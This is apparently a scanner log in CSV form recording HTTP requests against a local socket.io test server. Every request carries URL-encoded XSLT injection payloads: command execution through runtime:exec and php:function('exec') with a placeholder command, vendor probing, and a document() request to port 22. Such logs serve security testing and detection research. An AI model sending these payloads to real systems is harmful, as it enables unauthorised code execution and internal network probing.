Id,Req. Timestamp,Resp. Timestamp,Método,URL,Code,Reason,RTT,Size Resp. Header,Size Resp. Body
80969,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:04 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,258,153,40
80972,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:04 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&t=N9n_j7M&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,303,153,40
80973,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:04 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&transport=websocket&sid=RZK8ondCBIaEyA7yAADl,101,Switching Protocols,311,129,0
80976,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:04 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3C&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,344,153,34
80977,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:04 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2F10.0.2.2%3A22%27%29%22%2F%3E&transport=websocket&sid=RZK8ondCBIaEyA7yAADl,101,Switching Protocols,345,129,0
80981,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:05 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,262,153,34
80980,Tue Jun 02 01:36:04 WEST 2020,Tue Jun 02 01:36:05 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E&transport=websocket&sid=RZK8ondCBIaEyA7yAADl,101,Switching Protocols,247,129,0
80985,Tue Jun 02 01:36:05 WEST 2020,Tue Jun 02 01:36:05 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=system-property%28%27xsl%3Avendor%27%29%2F%3E&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,276,153,34
80984,Tue Jun 02 01:36:05 WEST 2020,Tue Jun 02 01:36:05 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E&transport=websocket&sid=RZK8ondCBIaEyA7yAADl,101,Switching Protocols,273,129,0
80988,Tue Jun 02 01:36:05 WEST 2020,Tue Jun 02 01:36:05 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=%3C&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,295,92,17
80989,Tue Jun 02 01:36:05 WEST 2020,Tue Jun 02 01:36:05 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,301,153,34
80992,Tue Jun 02 01:36:05 WEST 2020,Tue Jun 02 01:36:06 WEST 2020,GET,http://10.0.2.2:3000/socket.io/?EIO=3&transport=polling&t=%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--&sid=RZK8ondCBIaEyA7yAADl,400,Bad Request,372,153,34
